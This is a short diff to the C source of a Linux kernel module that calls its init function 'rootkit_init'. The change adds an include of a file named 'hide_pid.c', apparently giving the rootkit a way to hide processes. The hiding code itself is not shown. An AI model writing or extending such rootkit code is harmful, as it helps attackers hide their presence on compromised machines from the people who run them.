@@ -4,7 +4,7 @@
 #include <linux/device.h>
 #include <linux/module.h>
 #include "functions.c"
-
+#include "hide_pid.c"
 // 模块加载、卸载函数定义
 static int __init rootkit_init(void)
 {
